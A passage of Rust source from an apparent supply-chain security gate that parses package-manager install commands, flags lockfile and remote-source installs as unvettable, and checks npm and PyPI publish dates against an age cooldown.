                unvettable: Some(format!(
                    "shell tokenisation failed ({error}); refusing to treat an ambiguous command as safe"
                )),
            });
            return;
        }
    };
    let mut segment_start = 0;
    while segment_start < tokens.len() {
        while segment_start < tokens.len() && is_shell_operator(&tokens[segment_start].1) {
            segment_start += 1;
        }
        if segment_start >= tokens.len() {
            break;
        }
        let segment_end = (segment_start..tokens.len())
            .find(|&idx| is_shell_operator(&tokens[idx].1))
            .unwrap_or(tokens.len());

        for head_idx in segment_start..segment_end {
            let head_offset = tokens[head_idx].0;
            if claimed
                .range(..=head_offset)
                .next_back()
                .is_some_and(|(_, &end)| head_offset < end)
            {
                continue;
            }
            let Some(manager) = normalised_manager(&tokens[head_idx].1) else {
                continue;
            };
            let Some((spec, ambiguous_option, source_option_detail)) =
                locate_token_install(&manager, &tokens, head_idx, segment_end)
            else {
                continue;
            };

            let end_offset = tokens
                .get(segment_end)
                .map(|(offset, _)| *offset)
                .unwrap_or(cmd.len());
            claimed.insert(head_offset, end_offset.max(head_offset + 1));

            if ambiguous_option {
                out.push(ParsedInstall {
                    ecosystem: spec.ecosystem,
                    packages: Vec::new(),
                    has_editable: false,
                    unvettable: Some(format!(
                        "{} options before the install verb have ambiguous arity; refusing to guess the package set",
                        manager
                    )),
                });
                continue;
            }
            if let Some(caveat) = spec.local_only_caveat {
                out.push(ParsedInstall {
                    ecosystem: spec.ecosystem,
                    packages: Vec::new(),
                    has_editable: false,
                    unvettable: Some(caveat.to_string()),
                });
                continue;
            }
            if !spec.accepts_packages {
                out.push(ParsedInstall {
                    ecosystem: spec.ecosystem,
                    packages: Vec::new(),
                    has_editable: false,
                    unvettable: Some(
                        "bare lockfile install — package set is resolved from project metadata the gate cannot vet"
                            .to_string(),
                    ),
                });
                continue;
            }

            let arg_string = tokens[spec.verb_end_idx + 1..segment_end]
                .iter()
                .map(|(_, token)| token.as_str())
                .collect::<Vec<_>>()
                .join(" ");
            let (packages, has_editable, source_detail) = parse_package_args(&arg_string, &manager);
            let parsed_detail = if packages.is_empty() && !has_editable {
                Some(source_detail.unwrap_or_else(|| {
                    "install resolves packages from a lockfile/requirements file the gate cannot vet"
                        .to_string()
                }))
            } else {
                source_detail
            };
            out.push(ParsedInstall {
                ecosystem: spec.ecosystem,
                packages,
                has_editable,
                unvettable: source_option_detail.or(parsed_detail),
            });
        }

        segment_start = segment_end.saturating_add(1);
    }
}

/// Scan the shell token stream for package-manager install verbs that
/// resolve their package set from a lockfile (no package-name token
/// follows). Covers npm/pnpm/yarn (via lockfile install) plus
/// `poetry install` and `uv sync` (which resolve from
/// pyproject.toml / uv.lock — Antigravity peer-review HIGH).
///
/// A package name is a bare token that is neither a flag (`-`-prefixed)
/// nor a shell operator; trailing flags and shell operators must NOT
/// defeat the classification. A verb followed by a package token is left
/// for the package-bearing regexes above.
fn detect_bare_lockfile_installs(
    cmd: &str,
    claimed: &mut std::collections::BTreeMap<usize, usize>,
    out: &mut Vec<ParsedInstall>,
) {
    let Ok(tokens) = shell_tokens(cmd) else {
        // `detect_tokenised_installs` runs immediately before this pass and
        // owns the single fail-closed finding for the same error.
        return;
    };
    // Look-ahead helper that lowercases the Nth token relative to `idx` so
    // verb sub-commands like `INSTALL`, `Ci`, `Sync` classify the same as
    // their canonical lowercase form (Windows file-systems and shells are
    // case-preserving but case-insensitive on the head; the gate must agree).
    let next_lower = |i: usize| tokens.get(i).map(|(_, t)| t.to_ascii_lowercase());

    let mut idx = 0;
    while idx < tokens.len() {
        let (start, raw_tok) = (&tokens[idx].0, tokens[idx].1.as_str());
        // Basename-normalise the head token before matching. `installer_basename`
        // strips POSIX/Windows path separators AND `.cmd`/`.exe`/`.bat`
        // (case-insensitively, looping for `npm.cmd.exe`-style chains).
        // Lowercase the result so `NPM`, `Npm`, `PNPM` etc. all classify
        // alongside their canonical form. Closes the abs/relative-path
        // bypass observed on 2026-05-23 plus Codex/agy peer-review HIGH on #142.
        let tok_norm = installer_basename(raw_tok).to_ascii_lowercase();
        // Identify an install-verb head and what it implies.
        //   `bare_eco`        — ecosystem of this bare lockfile install.
        //   `accepts_packages` — true if the verb may take a positional
        //                       package (so a non-flag token after the verb
        //                       means "not bare"). For verbs that *never*
        //                       take a positional package (poetry install,
        //                       uv sync, uv pip sync, npm ci, yarn install,
        //                       bare yarn) this is false, and the package
        //                       scan is skipped — closes the Codex+agy
        //                       BLOCKER where `poetry install --with dev`
        //                       (and `uv sync --extra dev`) misclassified
        //                       `dev` as a package and silently Skipped.
        let (verb_span_end_idx, bare_eco, accepts_packages) = match tok_norm.as_str() {
            "npm" | "pnpm" => {
                match next_lower(idx + 1).as_deref() {
                    // `npm install` / `pnpm install` / pnpm `i` *can* take a
                    // package. Keep the scan to distinguish bare-vs-named —
                    // though the named case is normally claimed upstream by
                    // NPM_RE / PNPM_RE; this is the fallback.
                    Some("install") | Some("i") => (idx + 1, Some(Ecosystem::Npm), true),
                    // Lab #144 comment follow-up: `pnpm update` may take a
                    // package, but bare `pnpm update` updates from lockfile /
                    // manifest state and must not silently Skip.
                    Some("update") if tok_norm == "pnpm" => (idx + 1, Some(Ecosystem::Npm), true),
                    // `npm ci` / `pnpm ci` never takes a package — value-
                    // consuming flags don't apply, always bare.
                    Some("ci") => (idx + 1, Some(Ecosystem::Npm), false),
                    _ => {
                        idx += 1;
                        continue;
                    }
                }
            }
            // #144 — `bun install` / `bun i` (bare) reads bun.lockb. Can take
            // a package (`bun install <pkg>`), so keep the scan to distinguish
            // bare-vs-named — the named case is claimed upstream by BUN_RE.
            "bun" => match next_lower(idx + 1).as_deref() {
                Some("install") | Some("i") => (idx + 1, Some(Ecosystem::Npm), true),
                _ => {
                    idx += 1;
                    continue;
                }
            },
            "yarn" => match next_lower(idx + 1).as_deref() {
                // `yarn install` never takes a positional package.
                Some("install") => (idx + 1, Some(Ecosystem::Npm), false),
                // Bare `yarn` or `yarn` followed by a shell operator IS an
                // install (no sub-command = `yarn install` shorthand).
                // BUT `yarn --version`, `yarn -v`, `yarn --help`, `yarn -h`
                // are diagnostic invocations that do NOT install anything.
                // Codex peer review on #143 flagged the bare over-match;
                // exclude the known help/version flags here.
                Some(next) if is_yarn_help_or_version_flag(next) => {
                    idx += 1;
                    continue;
                }
                Some(next) if next.starts_with('-') || is_shell_operator(next) => {
                    (idx, Some(Ecosystem::Npm), false)
                }
                None => (idx, Some(Ecosystem::Npm), false),
                _ => {
                    idx += 1;
                    continue;
                }
            },
            // `poetry install` resolves from pyproject.toml / poetry.lock and
            // takes ONLY flag arguments (`--with <group>`, `--without`,
            // `--only`, `--no-root`, `--sync`, …). Never a positional
            // package — `poetry add foo` is the package-bearing form,
            // claimed by POETRY_RE upstream.
            "poetry" => match next_lower(idx + 1).as_deref() {
                Some("install") => (idx + 1, Some(Ecosystem::Pypi), false),
                Some("update") => (idx + 1, Some(Ecosystem::Pypi), true),
                _ => {
                    idx += 1;
                    continue;
                }
            },
            // `uv sync` (and `uv pip sync`) resolves from uv.lock. Takes
            // only flag arguments (`--extra <name>`, `--group <name>`,
            // `--no-extra`, `--no-group`, `--inexact`, …). Never a positional
            // package — `uv install foo` / `uv add foo` / `uv pip install foo`
            // are package-bearing and claimed by UV_RE upstream.
            "uv" => match next_lower(idx + 1).as_deref() {
                Some("sync") => (idx + 1, Some(Ecosystem::Pypi), false),
                Some("pip") if next_lower(idx + 2).as_deref() == Some("sync") => {
                    (idx + 2, Some(Ecosystem::Pypi), false)
                }
                _ => {
                    idx += 1;
                    continue;
                }
            },
            // #144 — PDM. `pdm install` / `pdm sync` resolve from pdm.lock /
            // pyproject.toml and take only flag arguments. Never a positional
            // package — `pdm add <pkg>` is package-bearing, claimed by PDM_RE.
            "pdm" => match next_lower(idx + 1).as_deref() {
                Some("install") | Some("sync") => (idx + 1, Some(Ecosystem::Pypi), false),
                _ => {
                    idx += 1;
                    continue;
                }
            },
            // #144 — Pipenv. `pipenv install` is DUAL: bare reads Pipfile.lock,
            // with a pkg it is package-bearing (claimed by PIPENV_RE upstream).
            // Mirror npm's `install` handling: accepts_packages=true so a
            // following non-flag token means "not bare". `pipenv sync` always
            // reads the lockfile and never takes a positional package.
            "pipenv" => match next_lower(idx + 1).as_deref() {
                Some("install") => (idx + 1, Some(Ecosystem::Pypi), true),
                Some("sync") => (idx + 1, Some(Ecosystem::Pypi), false),
                _ => {
                    idx += 1;
                    continue;
                }
            },
            _ => {
                idx += 1;
                continue;
            }
        };

        let Some(eco) = bare_eco else {
            idx += 1;
            continue;
        };

        // For verbs that can take a positional package, walk the tokens
        // after the verb: stop at the first shell operator. A non-flag,
        // non-operator token is a package name → NOT a bare install.
        //
        // Verbs that NEVER take a positional skip this scan unconditionally,
        // so value-consuming flag arguments (`--with dev`, `--extra dev`)
        // do not flip `has_package` to true and cause a silent miss.
        let has_package = if accepts_packages {
            let mut found = false;
            let mut scan = verb_span_end_idx + 1;
            while scan < tokens.len() {
                let t = tokens[scan].1.as_str();
                if is_shell_operator(t) {
                    break;
                }
                if !t.starts_with('-') {
                    found = true;
                    break;
                }
                scan += 1;
            }
            found
        } else {
            false
        };

        if !has_package {
            // Skip if a higher-priority pattern already claimed this span.
            // O(log n) via BTreeMap range — was O(n) linear scan (#149).
            let already_claimed = claimed
                .range(..=*start)
                .next_back()
                .is_some_and(|(_, &end)| *start < end);
            if !already_claimed {
                // Claim the full verb span (head token through the verb
                // token), not just the head — the end is read by no later
                // pass today, but a short span would silently break dedup
                // if another detector is added after this one.
                let verb_end = tokens[verb_span_end_idx].0 + tokens[verb_span_end_idx].1.len();
                claimed.insert(*start, verb_end);
                out.push(ParsedInstall {
                    ecosystem: eco,
                    packages: Vec::new(),
                    has_editable: false,
                    unvettable: Some(match eco {
                        Ecosystem::Npm => "bare lockfile install — pulls the dependency tree \
                                           from package-lock.json/pnpm-lock.yaml/yarn.lock/bun.lockb \
                                           the gate cannot vet"
                            .to_string(),
                        Ecosystem::Pypi => "bare lockfile install — pulls the dependency tree \
                                            from poetry.lock/uv.lock/pdm.lock/Pipfile.lock/pyproject.toml \
                                            the gate cannot vet"
                            .to_string(),
                        Ecosystem::Unknown => "bare lockfile install — ecosystem could not be \
                                               resolved; the gate cannot vet"
                            .to_string(),
                    }),
                });
            }
        }

        idx = verb_span_end_idx + 1;
    }
}

/// Split a CLI argument token into `(flag, attached_value)`.
///
/// Returns `None` when the token is not a flag (does not start with `-`).
/// For a flag, the value is `Some` only when an attached `=` form is used:
///   `--requirement=req.txt` -> `("--requirement", Some("req.txt"))`
///   `-r=req.txt`            -> `("-r", Some("req.txt"))`
///   `--requirement`         -> `("--requirement", None)`
///   `-r`                    -> `("-r", None)`
/// This mirrors the established `a == "--config" || a.starts_with("--config=")`
/// attached-form handling used by other arg checkers in the codebase.
fn split_attached_flag(tok: &str) -> Option<(&str, Option<&str>)> {
    if !tok.starts_with('-') {
        return None;
    }
    match tok.split_once('=') {
        Some((flag, value)) => Some((flag, Some(value))),
        None => Some((tok, None)),
    }
}

/// pip/uv flags that take a value in the next token. These must consume
/// their value so the value isn't misclassified as a package name. The list
/// is intentionally pip-focused — see #145 case 3. npm equivalents are out
/// of scope (very rare to see value-consuming flags in npm installs).
const PIP_VALUE_CONSUMING_FLAGS: &[&str] = &[
    // package destination
    "-t",
    "--target",
    "--prefix",
    "--root",
    // index discovery
    "--index-url",
    "-i",
    "--extra-index-url",
    "--find-links",
    "-f",
    // platform / interpreter targeting
    "--platform",
    "--python-version",
    "--implementation",
    "--abi",
    // network / trust
    "--trusted-host",
    "--proxy",
    "--cert",
    "--client-cert",
    // wheel / binary policy
    "--no-binary",
    "--only-binary",
    // upgrade strategy
    "--upgrade-strategy",
    // build / cache directories
    "--build",
    "--cache-dir",
    "--src",
    "--log",
];

/// Returns (registry-package-names with optional pinned version,
/// saw_editable_arg, lockfile_source). `lockfile_source` is `Some(detail)`
/// when a `-r`/`--requirement`/`-c`/`--constraint` indirection flag was seen
/// (in either the separate or attached `=` form).
fn parse_package_args(s: &str, manager: &str) -> ParsedPackageArgs {
    let mut pkgs = Vec::new();
    let mut editable = false;
    let mut lockfile_source: Option<String> = None;
    let mut tokens = s.split_whitespace().peekable();

    while let Some(tok) = tokens.next() {
        // Inline shell comment — the rest of the line is annotation, not
        // packages. `pip install flask # production` previously slurped
        // `#` and `production` as packages, both 404'd, cascaded to Ask.
        // #145 case 2.
        if tok.starts_with('#') {
            break;
        }
        // Requirements / constraints indirection. Accept BOTH the separate
        // form (`-r req.txt`, `--requirement req.txt`) and the attached `=`
        // form (`--requirement=req.txt`, `-r=req.txt`). When the file is
        // attached, the value travels in the same token — splitting on `=`
        // recovers it. Either way, set `lockfile_source` so the install is
        // flagged unvettable (#111 G1 follow-up).
        if let Some((flag, attached)) = split_attached_flag(tok) {
            if matches!(flag, "-e" | "--editable") {
                let target = match attached {
                    Some(value) if !value.is_empty() => Some(value),
                    Some(_) => None,
                    None => tokens
                        .peek()
                        .copied()
                        .filter(|value| !value.starts_with('-'))
                        .and_then(|_| tokens.next()),
                };
                let Some(target) = target else {
                    lockfile_source.get_or_insert_with(|| {
                        format!(
                            "{flag} is missing its editable target; the install command cannot be vetted"
                        )
                    });
                    continue;
                };
                if is_remote_package_source(target) {
                    lockfile_source.get_or_insert_with(|| {
                        format!(
                            "install uses remote source '{}' ({}) — the gate cannot verify its registry identity",
                            sanitise_source_target(target),
                            flag
                        )
                    });
                } else {
                    editable = true;
                }
                continue;
            }
            if matches!(manager, "pip" | "uv" | "pipx")
                && matches!(flag, "-r" | "--requirement" | "-c" | "--constraint")
            {
                let target: String = match attached {
                    Some(v) => v.to_string(),
                    None => tokens.next().unwrap_or("(unspecified)").to_string(),
                };
                lockfile_source.get_or_insert_with(|| {
                    format!(
                        "install reads packages from '{}' ({}) — the gate cannot vet a \
                         requirements/constraints file",
                        sanitise_source_target(&target),
                        flag
                    )
                });
                continue;
            }
            let value = attached.or_else(|| tokens.peek().copied());
            if let Some(detail) = source_option_unvettable_detail(manager, flag, value) {
                lockfile_source.get_or_insert(detail);
            }
            if PIP_VALUE_CONSUMING_FLAGS.contains(&flag)
                || manager_option_takes_value(manager, flag)
            {
                // Value-bearing flag: consume the value token only when it
                // was NOT attached with `=`. #145 case 3.
                if attached.is_none() {
                    tokens.next();
                }
                continue;
            }
        }
        if tok.starts_with('-') {
            continue;
        }
        let token = trim_shell_token(tok);
        if is_remote_package_source(token) {
            lockfile_source.get_or_insert_with(|| {
                format!(
                    "install uses remote source '{}' — the gate cannot verify its registry identity",
                    sanitise_source_target(token)
                )
            });
            continue;
        }
        if token == "."
            || token.starts_with(".[")
            || token.starts_with("./")
            || token.starts_with("../")
            || token.starts_with('/')
            || token.starts_with("file:")
        {
            editable = true;
            continue;
        }

        let (name, version) = split_name_version(token);
        if !name.is_empty() {
            pkgs.push((name, version));
        }
    }

    (pkgs, editable, lockfile_source)
}

fn is_remote_package_source(token: &str) -> bool {
    let lower = trim_shell_token(token).to_ascii_lowercase();
    [
        "http://",
        "https://",
        "git://",
        "git+http://",
        "git+https://",
        "git+ssh://",
        "git+",
        "git@",
        "ssh://",
        "ftp://",
        "hg+",
        "svn+",
        "bzr+",
    ]
    .iter()
    .any(|prefix| lower.starts_with(prefix))
}

fn sanitise_scp_source(target: &str) -> Option<String> {
    let (user, location) = target.split_once('@')?;
    if !user.eq_ignore_ascii_case("git") {
        return None;
    }
    let (host, path) = location.split_once(':')?;
    if host.is_empty()
        || host
            .chars()
            .any(|character| character.is_whitespace() || matches!(character, '/' | '\\'))
    {
        return None;
    }
    let path = path
        .split(['?', '#'])
        .next()
        .filter(|path| !path.is_empty())?;
    let basename = path.rsplit('/').find(|component| !component.is_empty())?;
    Some(format!("{host}/{basename}"))
}

/// Reduce an untrusted source target to a credential-free host/basename (for
/// remote URLs) or basename (for local files) before it enters a finding.
fn sanitise_source_target(target: &str) -> String {
    let trimmed = trim_shell_token(target);
    let parse_target = trimmed
        .strip_prefix("git+")
        .or_else(|| trimmed.strip_prefix("hg+"))
        .or_else(|| trimmed.strip_prefix("svn+"))
        .or_else(|| trimmed.strip_prefix("bzr+"))
        .unwrap_or(trimmed);

    let label = sanitise_scp_source(trimmed)
        .or_else(|| {
            url::Url::parse(parse_target)
                .ok()
                .and_then(|url| {
                    let host = url.host_str()?;
                    let basename = url
                        .path_segments()
                        .and_then(|mut segments| segments.rfind(|part| !part.is_empty()))
                        .unwrap_or("<remote>");
                    Some(format!("{}/{}", host, basename))
                })
                .or_else(|| {
                    if is_remote_package_source(trimmed) {
                        // Never fall back to echoing a malformed remote target: URL
                        // parsing may have failed precisely around user-info, and a
                        // best-effort secret regex is not an authorization boundary.
                        Some("<remote>".to_string())
                    } else {
                        std::path::Path::new(trimmed)
                            .file_name()
                            .and_then(|name| name.to_str())
                            .map(str::to_string)
                    }
                })
        })
        .unwrap_or_else(|| "<unspecified>".to_string());

    crate::core::secret_redact::redact(&label).into_owned()
}

/// Strip a PEP 508 extras suffix (`name[extra]`, `name[a,b,c]`) from a
/// package spec. Returns the bare name portion; if no extras, returns the
/// input unchanged. The registry lookup endpoints reject the extras form,
/// so we must strip it before issuing the metadata call. #145 case 1.
fn strip_pep508_extras(s: &str) -> &str {
    match s.find('[') {
        Some(i) => &s[..i],
        None => s,
    }
}

/// Split a token like `requests==2.20.0`, `@types/node@22.10.0`, or `lodash`
/// into (name, optional pinned version). Only exact pins (`==X`, `name@X`)
/// are returned; ranges like `>=2.0` yield None for the version (we don't
/// pin a range to query).
fn split_name_version(s: &str) -> (String, Option<String>) {
    let stripped = s.trim_matches(|c: char| c == '"' || c == '\'');

    // npm scoped: @scope/name[@version]
    if let Some(rest) = stripped.strip_prefix('@') {
        if let Some(slash_idx) = rest.find('/') {
            let after_slash = &rest[slash_idx + 1..];
            if let Some(at_idx) = after_slash.find('@') {
                let name = format!("@{}/{}", &rest[..slash_idx], &after_slash[..at_idx]);
                let ver = after_slash[at_idx + 1..].to_string();
                let ver = if ver.is_empty() { None } else { Some(ver) };
                return (name, ver);
            }
            return (format!("@{}/{}", &rest[..slash_idx], after_slash), None);
        }
        return (format!("@{}", rest), None);
    }
    // pip exact pin
    if let Some(idx) = stripped.find("==") {
        return (
            strip_pep508_extras(&stripped[..idx]).to_string(),
            Some(stripped[idx + 2..].to_string()),
        );
    }
    // pip range specifiers — drop the spec, leave version None
    for sep in [">=", "<=", "~=", "!=", ">", "<"] {
        if let Some(idx) = stripped.find(sep) {
            return (strip_pep508_extras(&stripped[..idx]).to_string(), None);
        }
    }
    // npm: name@version
    if let Some(idx) = stripped.find('@') {
        return (
            stripped[..idx].to_string(),
            Some(stripped[idx + 1..].to_string()),
        );
    }
    (strip_pep508_extras(stripped).to_string(), None)
}

// ---------------------------------------------------------------------------
// HTTP queries
// ---------------------------------------------------------------------------

/// 8 MB cap on a single HTTP response body (SEC-I2).
///
/// The previous 64 MB cap was sized for npm's full `/<pkg>` document, but the
/// gate only ever reads `dist-tags` + `time` (npm) or `info`/`releases`/`urls`
/// (PyPI) — a few KB. For npm we also send the abbreviated-metadata `Accept`
/// header (`application/vnd.npm.install-v1+json`), which the registry honours
/// by returning a document ~100x smaller. 8 MB is comfortably above any
/// legitimate abbreviated response while denying a hostile registry the
/// ability to stream 64 MB per package into a short-lived hook process.
const HTTP_MAX_BYTES: u64 = 8 * 1024 * 1024;

/// npm abbreviated-metadata media type. The registry returns a far smaller
/// document (dist-tags + per-version essentials) when this is the `Accept`
/// header. The `time` map and `dist-tags` we rely on are still present.
const NPM_ABBREVIATED_ACCEPT: &str = "application/vnd.npm.install-v1+json";

fn read_body(resp: ureq::Response) -> Result<Vec<u8>, String> {
    use std::io::Read;
    let mut buf = Vec::new();
    // `take` caps the read; if the body would exceed the cap we still only
    // pull `HTTP_MAX_BYTES`, so a hostile infinite/huge response cannot
    // exhaust memory. A truncated body then fails JSON parsing -> Err ->
    // the caller fails closed to Ask.
    resp.into_reader()
        .take(HTTP_MAX_BYTES)
        .read_to_end(&mut buf)
        .map_err(|e| format!("read body: {}", e))?;
    Ok(buf)
}

/// Per-attempt HTTP timeout. With one retry on transient errors, total
/// wall-clock per call is bounded by `2 * HTTP_ATTEMPT_TIMEOUT +
/// HTTP_RETRY_BACKOFF`. Kept well under `CHECK_WALL_BUDGET` so a single
/// slow package can't blow the whole install's budget.
const HTTP_ATTEMPT_TIMEOUT: StdDuration = StdDuration::from_secs(5);
const HTTP_MAX_RETRIES: u32 = 1;
const HTTP_RETRY_BACKOFF: StdDuration = StdDuration::from_millis(250);

/// Lightweight tag for classifying an HTTP failure. Separated from
/// `ureq::Error` so the policy can be unit-tested without constructing a
/// real `ureq::Response`/`ureq::Transport`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HttpErrTag {
    Status(u16),
    Transport,
}

/// Should we retry after a failure of shape `tag`? Yes for transport-level
/// failures (DNS hiccup, connection reset, read timeout), rate limiting, and
/// 5xx responses (registry unhealthy, transient overload). Other 4xx statuses
/// are terminal request failures.
fn is_retryable_http_err_tag(tag: HttpErrTag) -> bool {
    match tag {
        HttpErrTag::Status(code) => code == 429 || (500..600).contains(&code),
        HttpErrTag::Transport => true,
    }
}

fn is_retryable_http_err(e: &ureq::Error) -> bool {
    let tag = match e {
        ureq::Error::Status(code, _) => HttpErrTag::Status(*code),
        ureq::Error::Transport(_) => HttpErrTag::Transport,
    };
    is_retryable_http_err_tag(tag)
}

fn http_get_json(url: &str) -> Result<Value, String> {
    let mut last_err: Option<String> = None;
    for attempt in 0..=HTTP_MAX_RETRIES {
        if attempt > 0 {
            std::thread::sleep(HTTP_RETRY_BACKOFF);
        }
        let mut req = ureq::get(url)
            .set("User-Agent", "contextcrawler-supply-chain-gate/0.1")
            .timeout(HTTP_ATTEMPT_TIMEOUT);
        // Request npm's abbreviated metadata where applicable — ~100x smaller.
        // PyPI ignores the header, so it is safe to send unconditionally for npm
        // hosts only.
        if url.starts_with("https://registry.npmjs.org/") {
            req = req.set("Accept", NPM_ABBREVIATED_ACCEPT);
        }
        match req.call() {
            Ok(resp) => {
                let buf = read_body(resp)?;
                return serde_json::from_slice(&buf).map_err(|e| e.to_string());
            }
            Err(e) => {
                let retryable = is_retryable_http_err(&e);
                last_err = Some(format!("HTTP {}: {}", url, e));
                if !retryable {
                    break;
                }
            }
        }
    }
    Err(last_err.unwrap_or_else(|| format!("HTTP {}: no attempts", url)))
}

fn http_post_json(url: &str, body: &Value) -> Result<Value, String> {
    let payload = body.to_string();
    let mut last_err: Option<String> = None;
    for attempt in 0..=HTTP_MAX_RETRIES {
        if attempt > 0 {
            std::thread::sleep(HTTP_RETRY_BACKOFF);
        }
        let resp = ureq::post(url)
            .set("User-Agent", "contextcrawler-supply-chain-gate/0.1")
            .set("Content-Type", "application/json")
            .timeout(HTTP_ATTEMPT_TIMEOUT)
            .send_string(&payload);
        match resp {
            Ok(r) => {
                let buf = read_body(r)?;
                return serde_json::from_slice(&buf).map_err(|e| e.to_string());
            }
            Err(e) => {
                let retryable = is_retryable_http_err(&e);
                last_err = Some(format!("HTTP {}: {}", url, e));
                if !retryable {
                    break;
                }
            }
        }
    }
    Err(last_err.unwrap_or_else(|| format!("HTTP {}: no attempts", url)))
}

type PackageMetadata = (String, DateTime<Utc>);

/// A fresh mutable cache entry may short-circuit the network only when its
/// publish time necessarily triggers the configured cooldown. In that case it
/// can only make the decision stricter (Block); metadata old enough to permit
/// Allow is always revalidated against the authoritative registry. `cache_get`
/// already discards entries outside the on-disk TTL, so `None` also covers a
/// stale hint.
fn revalidate_cached_metadata<F>(
    cached_hint: Option<PackageMetadata>,
    cooldown_days: u32,
    fetch_authoritative: F,
) -> Result<(PackageMetadata, bool), String>
where
    F: FnOnce() -> Result<PackageMetadata, String>,
{
    if let Some(cached) = cached_hint.as_ref() {
        let age = (Utc::now() - cached.1).max(ChronoDuration::zero());
        if age < ChronoDuration::days(i64::from(cooldown_days)) {
            return Ok((cached.clone(), false));
        }
    }
    let authoritative = fetch_authoritative()?;
    let cache_needs_refresh = cached_hint.as_ref() != Some(&authoritative);
    Ok((authoritative, cache_needs_refresh))
}

/// Resolve (version, publish_time) for the package. If `pinned` is Some, use
/// that version; otherwise resolve and use the registry's `latest`.
/// Cache keys include the version so pinned-and-unpinned don't collide.
fn npm_metadata(
    pkg: &str,
    pinned: Option<&str>,
    cooldown_days: u32,
) -> Result<PackageMetadata, String> {
    let cache_key = format!("{}@{}", pkg, pinned.unwrap_or("__latest__"));
    let cached_hint = cache_get(Ecosystem::Npm, &cache_key);
    let ((resolved, publish), refresh_cache) =
        revalidate_cached_metadata(cached_hint, cooldown_days, || {
            // Always query the full /<pkg> doc since per-version endpoints
            // don't expose publish times.
            let url = format!("https://registry.npmjs.org/{}", urlencoding(pkg));
            let v = http_get_json(&url)?;
            let resolved = match pinned {
                Some(ver) => ver.to_string(),
                None => v
                    .pointer("/dist-tags/latest")
                    .and_then(|x| x.as_str())
                    .ok_or_else(|| "no dist-tags/latest".to_string())?
                    .to_string(),
            };
            let ts = v
                .pointer(&format!("/time/{}", resolved))
                .and_then(|x| x.as_str())
                .ok_or_else(|| format!("no publish time for version {}", resolved))?;
            let publish = parse_iso8601(ts)?;
            Ok((resolved, publish))
        })?;
    if refresh_cache {
        cache_put(Ecosystem::Npm, &cache_key, &resolved, &publish);
    }
    Ok((resolved, publish))
}

fn pypi_metadata(
    pkg: &str,
    pinned: Option<&str>,
    cooldown_days: u32,
) -> Result<PackageMetadata, String> {
    let cache_key = format!("{}@{}", pkg, pinned.unwrap_or("__latest__"));
    let cached_hint = cache_get(Ecosystem::Pypi, &cache_key);
    let ((resolved, publish), refresh_cache) =
        revalidate_cached_metadata(cached_hint, cooldown_days, || {
            // When pinned, use the version-specific endpoint (smaller
            // response). Otherwise discover info.version first.
            if let Some(ver) = pinned {
                let url = format!(
                    "https://pypi.org/pypi/{}/{}/json",
                    urlencoding(pkg),
                    urlencoding(ver)
                );
                let v = http_get_json(&url)?;
                let urls = v
                    .get("urls")
                    .and_then(|x| x.as_array())
                    .ok_or_else(|| "no urls in pypi response".to_string())?;
                let first = urls.first().ok_or_else(|| "empty urls list".to_string())?;
                let ts = first
                    .get("upload_time_iso_8601")
                    .or_else(|| first.get("upload_time"))
                    .and_then(|x| x.as_str())
                    .ok_or_else(|| "no upload_time".to_string())?;
                return Ok((ver.to_string(), parse_iso8601(ts)?));
            }

            let url = format!("https://pypi.org/pypi/{}/json", urlencoding(pkg));
            let v = http_get_json(&url)?;
            let latest = v
                .pointer("/info/version")
                .and_then(|x| x.as_str())
                .ok_or_else(|| "no info/version".to_string())?
                .to_string();
            let arr = v
                .pointer(&format!("/releases/{}", latest))
                .and_then(|x| x.as_array())
                .ok_or_else(|| "no releases".to_string())?;
            let first = arr.first().ok_or_else(|| "empty releases".to_string())?;
            let ts = first
                .get("upload_time_iso_8601")
                .or_else(|| first.get("upload_time"))
                .and_then(|x| x.as_str())
                .ok_or_else(|| "no upload_time".to_string())?;
            Ok((latest, parse_iso8601(ts)?))
        })?;
    if refresh_cache {
        cache_put(Ecosystem::Pypi, &cache_key, &resolved, &publish);
    }
    Ok((resolved, publish))
}

/// Parse an ISO-8601 / RFC-3339 timestamp into a UTC `DateTime`.
///
/// SEC-I3 hardening: the package-age cooldown is the gate's primary control.
/// A misparse that yields a far-past date silently skips the cooldown, and a
/// far-future date used to be clamped to zero age — both wave a package
/// through. So:
///   - A failed parse is an error (`Err`), never a silent fallback. The old
///     `{}Z`-suffix retry could coerce a malformed string into a bogus value;
///     we keep a *conservative* retry only for the bare missing-`Z` case
///     (`2024-01-01T00:00:00` -> append `Z`) and reject everything else.
///   - A parsed timestamp more than ~1 day in the future is rejected as an
///     error rather than clamped — a future publish date is not trustworthy
///     and must not be allowed to satisfy the cooldown.
fn parse_iso8601(s: &str) -> Result<DateTime<Utc>, String> {
    let parsed = DateTime::parse_from_rfc3339(s)
        .or_else(|_| {
            // Conservative retry: only for a timestamp that is well-formed
            // except for a missing trailing `Z`. We do NOT strip an existing
            // `Z` and re-append (that masked malformed input). The string
            // must not already carry a timezone designator.
            let t = s.trim();
            // This guard rejects strings that already carry a `Z` or a `+HH:MM`
            // offset (re-appending `Z` would mask malformed input). It does NOT
            // need to test for `-HH:MM` negative offsets: a well-formed negative
            // offset is parsed by the primary `parse_from_rfc3339` above and
            // never reaches this retry. A malformed string with a `-` that
            // slips through gets `Z` appended, producing invalid RFC3339 (two
            // timezone designators) that `parse_from_rfc3339` rejects — so the
            // gap fails closed. The guard gap is harmless.
            if t.ends_with('Z') || t.contains('+') {
                Err("malformed timestamp".to_string())
            } else {
                DateTime::parse_from_rfc3339(&format!("{}Z", t)).map_err(|e| e.to_string())
            }
        })
        .map_err(|_| format!("unparseable timestamp: {:?}", s))?;

    let dt = parsed.with_timezone(&Utc);

    // Reject implausibly future-dated timestamps. A package cannot have been
    // published more than a day from now; treating such a value as valid
    // would let a hostile registry skip the age cooldown.
    let skew = ChronoDuration::days(1);
    if dt > Utc::now() + skew {
        return Err(format!(
            "timestamp {} is more than {}d in the future — refusing to trust it",
            dt,
            skew.num_days()
        ));
    }

    // Both supported public registries post-date 2000. Older values cannot
    // be legitimate package publish times and would otherwise age a forged
    // cache/registry record past every cooldown.
    const EARLIEST_PLAUSIBLE_PUBLISH_UNIX: i64 = 946_684_800;
    if dt.timestamp() < EARLIEST_PLAUSIBLE_PUBLISH_UNIX {
        return Err(format!(
            "timestamp {} predates public package registries — refusing to trust it",
            dt
        ));
    }

    Ok(dt)
}

fn urlencoding(s: &str) -> String {
    // Minimal percent-encoding for path segments.
    s.bytes()
        .map(|b| match b {
